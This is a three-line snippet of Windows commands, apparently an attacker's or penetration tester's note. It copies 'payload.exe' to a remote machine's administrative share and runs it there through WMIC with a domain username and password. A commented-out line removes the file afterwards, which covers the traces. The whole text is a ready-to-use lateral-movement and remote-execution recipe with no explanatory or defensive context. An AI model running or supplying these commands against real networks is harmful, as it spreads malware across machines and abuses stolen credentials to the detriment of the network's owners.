copy payload.exe \\pc-1.domain.local\c$\windows\temp\payload.exe
wmic /node:"pc-1" /user:"domain.local\user1" /password:"userspassword" process call create "cmd.exe /C C:\windows\temp\payload.exe"
# del \\pc-1.domain.local\c$\windows\temp\payload.exe
